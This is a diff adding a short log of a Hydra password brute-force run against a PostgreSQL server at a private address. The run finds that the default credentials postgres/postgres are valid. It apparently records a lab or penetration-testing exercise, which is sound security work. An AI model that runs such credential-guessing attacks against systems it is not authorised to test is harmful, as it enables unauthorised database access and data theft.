@@ -1,0 +1,8 @@
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-06-20 02:01:36
+[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries, ~1 try per task
+[DATA] attacking postgres://192.168.1.122:5432/
+[5432][postgres] host: 192.168.1.122   login: postgres   password: postgres
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-06-20 02:01:37
